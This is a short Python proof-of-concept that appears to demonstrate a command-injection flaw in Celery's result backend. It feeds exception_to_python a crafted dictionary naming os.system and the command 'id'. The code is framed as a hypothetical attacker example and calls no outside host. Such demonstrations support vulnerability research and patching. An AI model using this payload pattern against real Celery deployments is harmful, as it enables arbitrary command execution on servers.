from celery import Celery

app = Celery('tasks', broker='pyamqp://guest@localhost//')

@app.task
def example_task():
    return "This is a task."

# Simulating an attacker manipulating the backend
# This is a hypothetical example of how an attacker could inject malicious data
malicious_data = {
    'result': 'malicious_command',
    'exc_module': 'os',
    'exc_type': 'system',
    'exc_message': 'id'  # This could be a command to execute
}

# This would lead to execution of the injected command
result = app.backend.exception_to_python(malicious_data)
print(result)  # This could execute 'id' command